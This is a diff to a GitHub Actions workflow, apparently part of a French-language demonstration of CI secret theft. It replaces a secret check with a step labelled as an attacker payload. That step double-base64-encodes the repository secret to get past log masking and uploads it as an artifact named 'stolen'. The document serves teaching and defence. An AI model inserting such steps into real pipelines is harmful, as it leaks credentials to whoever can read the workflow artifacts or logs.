@@ -9,19 +9,38 @@ jobs:
     runs-on: ubuntu-latest
 
     env:
-      DEMO_SECRET: ${{ secrets.DEMO_SECRET }}  # <-- vulnérabilité
+      DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
 
     steps:
       - name: Checkout code
         uses: actions/checkout@v4
 
-      - name: Normal step
-        run: echo "Pipeline started"
-
-      - name: Check secret availability
+      - name: Étape compromise
+        shell: bash
         run: |
-          if [ -z "$DEMO_SECRET" ]; then
-            echo "❌ Secret NOT available"
-          else
-            echo "✔ Secret available: $DEMO_SECRET"
-          fi
+          echo ""
+          echo "===== ⚠️ ATTACKER PAYLOAD ACTIVÉ ====="
+          echo "[Attacker] Lecture du secret : $DEMO_SECRET"
+
+          echo ""
+
+          echo "[Attacker] Encodage 1 fois (Base64)..."
+          ONE=$(echo -n "$DEMO_SECRET" | base64)
+          echo "[1] $ONE"
+
+          echo "[Attacker] Encodage 2 fois (Base64)..."
+          TWO=$(echo -n "$ONE" | base64)
+          echo "[2] $TWO"
+
+          echo ""
+          echo "[Attacker] Enregistrement du secret en double Base64 dans un fichier..."
+          echo -n "$TWO" > stolen_data_b64.txt
+
+          echo "[Attacker] Exfiltration terminée."
+          echo "======================================"
+
+      - name: Upload stolen data as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: stolen
+          path: stolen_data_b64.txt
